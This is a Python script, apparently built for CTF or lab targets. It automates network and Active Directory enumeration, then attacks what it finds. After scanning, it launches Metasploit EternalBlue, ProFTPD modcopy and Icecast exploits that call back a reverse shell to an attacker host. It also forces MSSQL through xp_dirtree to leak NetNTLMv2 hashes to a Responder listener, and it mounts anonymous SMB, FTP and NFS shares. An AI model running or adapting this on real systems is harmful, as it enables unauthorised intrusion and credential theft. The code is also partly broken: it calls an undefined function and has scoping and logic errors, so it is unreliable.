import os
import argparse
import sys
import time
from colorama import Fore
from pathlib import Path
from smbprotocol.connection import Connection, Dialects

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET
                                                                                                                                                                        
parser = argparse.ArgumentParser(description="EnumADv2",
formatter_class=argparse.ArgumentDefaultsHelpFormatter)

parser = argparse.ArgumentParser(description="EnumADv2", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-r", "--RHOST", action="store", help="RHOST")
parser.add_argument("-p", "--LPORT", action="store", help="LPORT")
parser.add_argument("-l", "--LHOST", action="store", help="LHOST")
parser.add_argument("-d", "--DOMAIN", action="store", help="Domain Name")
parser.add_argument("-D", "--DOWNLOAD", action="store_true", help="Download Tools")
parser.add_argument("-u", "--USERNAME", action="store", help="Username")
parser.add_argument("-P", "--PASSWORD", action="store", help="Password")

args = parser.parse_args()
parser.parse_args(args=None if sys.argv[1:] else ['--help'])

RHOST = args.RHOST
LPORT = args.LPORT
LHOST = args.LHOST
DOMAIN = args.DOMAIN
DOWNLOAD = args.DOWNLOAD
USERNAME = args.USERNAME
PASSWORD = args.PASSWORD

def DOWN():
	content = ("/usr/bin/rustscan")
	if (os.path.isfile(content) == True):
	   	print(f"{BLUE}RustScan Installed{RESET}")
	if (os.path.isfile(content) != True):
	   	print(f"{RED}RustScan not installed, installing{RESET}")
	   	URL="https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb" 
	   	os.system(f"wget -c --read-timeout=5 --tries=0 {URL}")
	   	os.system("sudo dpkg -i rustscan_2.0.1_amd64.deb")
	os.system("locate kerbrute_linux_amd64 > loc.txt")
	path = "loc.txt"
	with open (path, "r") as f:
		content = f.read()
		word = "dist/kerbrute_linux_amd64"
		if word in content:
			print(f"{YELLOW}Kerbrute installed not installing{RESET}")
		else:
			print(f"{MAGENTA}Installing kerbrute_linux_amd64")
	content = ("/usr/bin/ldapdomaindump")
	if (os.path.isfile(content) == True):
	   	print(f"{BLUE}LDAPDomainDump Installed{RESET}")
	if (os.path.isfile(content) != True):
		print(f"{RED}LDAPDomainDump not installed, installing{RESET}")
		os.system("pip3 install ldapdomaindump")

def RustScan():
	path="ports.txt"
	if (os.path.isfile(path) != True):
		print(f"{MAGENTA}Running RustScan and saving to ports.txt{RESET}")
		os.system(f"rustscan -u 5000 -a {RHOST} -- -Pn > ports.txt")
		print(f"{GREEN}Done running scan{RESET}")

def BLUE():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="445/tcp"
		if word in content:
			print(f"{MAGENTA}SMB is running, checking if it is vulnerable to anything with nmap scripts{RESET}")
			os.system(f"nmap -p 445 --script=smb-vuln* -Pn {RHOST} > blue.txt")
			with open ("blue.txt", "r") as f:
				content = f.read()
				word = "CVE:CVE-2017-0143"
				if word in content:
					print(f"{RED}Vulnerable to Eternal Blue{RESET}")
					os.system(f"msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set rhost {RHOST}; set lhost {LHOST}; set LPORT {LPORT}; run'")

def SMB():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="445/tcp"
		if word in content:
			print(f"{MAGENTA}Seeing if SMB is anonymous and saving output to SMB.txt{RESET}")
			os.system(f'smbclient -L "\\\\\\\\{RHOST}\\\\\" -U \" \"%\" " > SMB.txt')

def SMBMOUNT():
	if USERNAME is None and PASSWORD is None:
		with open("SMB.txt", "r") as f:
			content = f.read()
			word="ADMIN$" or "C$" or "IPC$" or "NETLOGON"
			if word in content:
				print(f"{YELLOW}SMB anonymous login allowed{RESET}")
				print(content)
				if sys.stdin.isatty():
					try:
						mountsmb = input("Share you would like to mount, if none press enter: ")
					except EOFError:
						mountsmb = ""  # Assign an empty string if EOF is encountered
				else:
					mountsmb = ""  # Assign an empty string if not running in an interactive terminal
def FTP():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="21/tcp"
		if word in content:
			print(f"{MAGENTA}FTP Running, trying some differnet things{RESET}")
			os.system(f"nmap -p 21 -sC -sV {RHOST} >> ports.txt")
			with open ("ports.txt", "r") as f:
				content = f.read()
				word = "ProFTPD 1.3.5"
				if word in content:
					print(f"{RED}PROFTPD 1.3.5 Running, exploiting now{RESET}")
					os.system(f"msfconsole -x 'use exploit/unix/ftp/proftpd_modcopy_exec; set lhost {LHOST}; set rhost {RHOST}; set lport {LPORT}; run'")
			if USERNAME is None and PASSWORD is None:
				print(f"{YELLOW}FTP Running mounting to folder FTP if anonymous access is allowed{RESET}")
				try:
					os.mkdir("FTP")
				except FileExistsError:
  					pass
				os.system(f"curlftpfs anonymous@{RHOST} FTP")
			if USERNAME is not None and PASSWORD is not None:
  				print(f"{YELLOW}FTP Running mounting to folder FTP with username {USERNAME} and password {PASSWORD}{RESET}")
  				try:
  					os.mkdir("FTP")
  				except FileExistsError:
  					pass
  				os.system(f"curlftpfs {USERNAME}:{PASSWORD}@{RHOST} FTP")

def MOUNT():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="2049/tcp"
		if word in content:
			print(f"{MAGENTA}Mount Running{RESET}")
			os.system(f"showmount -e {RHOST}")
			mount = input(f"Mount point running on {RHOST}: \n")
			try:
				os.mkdir("mount")
			except FileExistsError:
   				# directory already exists
   				pass
			os.system(f"sudo mount -t nfs {RHOST}:{mount} mount")

def ICE():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="8000/tcp"
		if word in content:
			print(f"{MAGENTA}Webserver on port 8000 running, checking service{RESET}")
			os.system(f"nmap -p 8000 -sC -sV {RHOST} -Pn > http.txt")
			path="http.txt"
			with open (path, "r") as f:
				content = f.read()
				word="Icecast streaming media server"
		if word in content:
			print(f"{BLUE}Icecast is running, trying to exploit{RESET}")
			os.system(f"msfconsole -x 'use exploit/windows/http/icecast_header; set lhost {LHOST}; set rhost {RHOST}; set rport 8000; set lport {LPORT}; run'")

def DOM():
	if DOMAIN == None:
		path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="88/tcp"
		if word in content:
			print(f"{GREEN}Getting Domain Name for {RHOST}{RESET}")
			os.system(f"crackmapexec smb {RHOST} -u administrator -p administrator | tail -n 1 | cut -d ']' -f 2 | cut -d '\\' -f 1 | tr -d \" \\t\\n\\r\" | sed -e 's/\x1b\[[0-9;]*m//g'  > domainname.txt")
			with open ("domainname.txt", "r") as f:
				content = f.read()
				print(f"{GREEN}Domain name is{BLUE} {content} {RESET} \n")

def LDAPSEARCH():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="636/tcp"
	if word in content:
		print(f"LDAP Running")
		os.system(f"crackmapexec smb {RHOST} -u fdjakf -p fdafjklf | tail -n 1 | cut -d ']' -f 2 | cut -d '\' -f 1 | tr -d \ \" \\t\\n\\r\\\" | sed -e 's/\x1b\[[0-9;]*m//g' > domainname.txt")
		os.system(f"cat domainname.txt | cut -d '.' -f 1 > dom1.txt")
		os.system(f"cat domainname.txt | cut -d '.' -f 2 > dom2.txt")
		print(f"{RED}May have to run multiple times depending on VPN connection speed{RESET}")
		with open ("dom1.txt", "r") as f:
			x = f.read()
			print(x)
		with open ("dom2.txt", "r") as f:
			y = f.read()
			print(y)
		if USERNAME is None and PASSWORD is None:
			print(f"{MAGENTA}Trying Anonymous LDAP Login and saving any output to ldap.txt{RESET}")
			os.system(f"ldapsearch -H ldap://{RHOST} -x -b \"DC={x},DC={y}\" '(objectclass=person)' > ldap.txt")
		if USERNAME is not None and PASSWORD is not None:
			print(f"{MAGENTA}Trying to dump LDAP with username {BLUE}{USERNAME} and password {BLUE}{PASSWORD} {RESET}")
			os.system(f"ldapsearch -H ldap://{RHOST} -x -b \"DC={x},DC={y}\" '(objectclass=person)' -D {USERNAME} -w {PASSWORD} > ldap.txt")
		os.remove("dom1.txt")
		os.remove("dom2.txt")
		os.system("cat ldap.txt | grep -i samaccountname > users.txt")
		os.system("cat ldap.txt | grep -i description > description.txt")

def LDAPDOMAINDUMP():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="636/tcp"
	if word in content:
		print(f"{YELLOW}LDAP Running, trying LDAPDOMAINDUMP and putting into folder LDAP{RESET}")
	try:
		os.mkdir("LDAP")
	except FileExistsError:
   		pass
	time.sleep(1)
	with open ("domainname.txt", "r") as f:
		y = f.read()
	os.chdir("LDAP")
	if USERNAME is not None and PASSWORD is not None:
		os.system(f"ldapdomaindump ldap://{RHOST} -u '{y}\\{USERNAME}' -p '{PASSWORD}'")
	if USERNAME is None and PASSWORD is None:
		os.system(f"ldapdomaindump ldap://{RHOST}")
	os.chdir('..')

def MSSQL():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="1433/tcp"
	if word in content:
		print(f"{YELLOW}MSSQL is running{RESET}")
	if USERNAME is not None and PASSWORD is not None:
		if LHOST is None:
			LHOST = input("LHOST: \n")
		print(f"{YELLOW}Trying to obtain NetNTLMv2 Hashes from MSSQL{RESET}")
		with open ("domainname.txt", "r") as f:
			y = f.read()
		respond = input(f"{RED}Start responder in another terminal, press enter to continue{RESET}")
		os.system(f"sqsh -S {RHOST} -U {USERNAME} -P '{PASSWORD}' -C \"xp_dirtree\" '\\\\{LHOST}\\some\\thing' -c")

if DOWNLOAD == True:
	DOWN()
if RHOST is not False:
	RustScan()
	DOM()
	BLUE()
	LDAPSEARCH()
	LDAPDOMAINDUMP()
	MSSQL()
	MOUNT()
	ICE()
	FTP()
	SMBKILLER()
	SMB()
	SMBMOUNT()
